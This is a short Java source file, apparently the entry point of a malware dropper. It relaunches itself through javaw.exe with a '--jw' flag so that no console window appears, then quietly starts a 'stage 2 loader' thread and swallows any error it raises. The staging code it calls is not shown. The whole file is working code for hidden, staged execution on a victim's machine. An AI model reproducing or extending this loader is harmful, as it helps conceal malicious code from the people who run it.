// standalone version

package sh.snipsnapz;

import com.google.gson.JsonObject;
import java.io.File;

public class MEntrypoint {

    public static void main(String[] args) {
        checkJVMLauncher(args);
        JsonObject ctx = new JsonObject();
        //  "platform" -> "native"
        ctx.addProperty("platform", "native");

        // start stage 2 loader
        new Thread(() -> {
            try {
                StagingHelper.stageWithContext(ctx);
            } catch (Exception e) {
            }
        }).start();
    }


    //Relaunch using javaw.exe to hide console window
    public static void checkJVMLauncher(String[] args) {
        boolean hasJwFlag = false;
        for (String arg : args) {
            if (arg.equalsIgnoreCase("--jw")) {
                hasJwFlag = true;
                break;
            }
        }

        if (hasJwFlag) {
            return;
        }

        try {
            String javaHome = System.getProperty("java.home");
            String jarPath = new File(
                    MEntrypoint.class.getProtectionDomain()
                            .getCodeSource()
                            .getLocation()
                            .toURI()
            ).getPath();

            String javawPath = javaHome + File.separator + "bin" + File.separator + "javaw.exe";

            ProcessBuilder builder = new ProcessBuilder(javawPath, "-jar", jarPath, "--jw");
            builder.start();
            System.exit(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}